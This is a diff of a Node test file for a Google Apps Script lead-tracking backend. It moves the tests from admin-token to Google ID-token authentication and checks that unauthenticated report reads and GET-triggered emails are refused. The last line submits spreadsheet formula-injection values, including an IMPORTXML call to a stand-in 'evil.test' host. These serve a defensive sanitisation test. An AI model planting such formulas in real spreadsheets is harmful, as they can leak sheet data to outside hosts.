@@ -25,18 +25,21 @@ global.ScriptApp={getProjectTriggers:()=>[],newTrigger:()=>({timeBased(){return 
 global.Logger={log:()=>{}};
 const props={REPORT_ADMIN_TOKEN:'test-admin-token-123456',ANTHROPIC_API_KEY:'sk-test',OCR_ACCESS_TOKEN:'test-operator-secret'};
 global.PropertiesService={getScriptProperties:()=>({getProperty:k=>props[k]||null,setProperty:(k,v)=>props[k]=v})};
+const {installGasAuth,withIdentity}=require('./test_helpers/gas-auth.cjs');
+const GOOGLE_ID_TOKEN=installGasAuth(globalThis,{activeOcr:true});
 eval(fs.readFileSync('Code.gs','utf8'));
+doPost=withIdentity(doPost,GOOGLE_ID_TOKEN);
 
 let pass=0,fail=0;
 const check=(c,n)=>c?(pass++,console.log('✅',n)):(fail++,console.log('❌',n));
 const post=d=>JSON.parse(doPost({postData:{contents:JSON.stringify(d)}})._text);
 setup();
 
-let r=JSON.parse(reportPost({action:'reporte'})._text);
-check(r.ok===false&&/No autorizado/.test(r.error),'S1 未提供管理密鑰不可讀報告');
-r=post({accion:'enviarReporteA',token:'incorrect-token-123456'});
+let r=JSON.parse(reportPost({action:'reporte',idToken:''})._text);
+check(r.ok===false&&/Iniciá sesión/.test(r.error),'S1 未提供管理密鑰不可讀報告');
+r=post({accion:'enviarReporteA',idToken:'invalid-token'});
 check(r.ok===false,'S1 錯誤密鑰不可觸發寄信');
-const getSend=JSON.parse(doGet({parameter:{action:'enviarReporteA',token:'test-admin-token-123456'}})._text);
+const getSend=JSON.parse(doGet({parameter:{action:'enviarReporteA',idToken:GOOGLE_ID_TOKEN}})._text);
 check(getSend.ok===false&&/Método no permitido/.test(getSend.error),'S1 GET 不可觸發寄信副作用');
 
 r=post({nombre:'=IMPORTXML("https://evil.test")',empresa:'+SUM(1,1)',calificacion:'A - Caliente',requestId:'request_secure_001'});
